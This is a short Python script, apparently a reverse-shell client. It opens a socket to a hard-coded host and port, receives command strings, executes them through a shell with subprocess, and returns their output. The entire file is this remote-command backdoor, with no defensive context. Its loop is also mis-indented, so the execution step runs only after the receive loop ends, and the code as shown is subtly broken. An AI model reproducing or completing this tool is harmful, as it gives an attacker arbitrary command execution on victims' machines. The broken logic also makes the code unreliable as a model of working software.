import socket
import subprocess

host = "127.0.0.1"
port = 8000


try:
    client = socket.socket()
    client.connect((host, port))
    print("connected to server")
    while True:
        data = client.recv(4096).decode()
        if data == "exit":
            break

    result = subprocess.run(data, shell=True,capture_output=True, text=True)
    client.send(result.stdout.encode())
except KeyboardInterrupt:
    print("Keyboard Interrupt Detected")
finally:    
    client.close()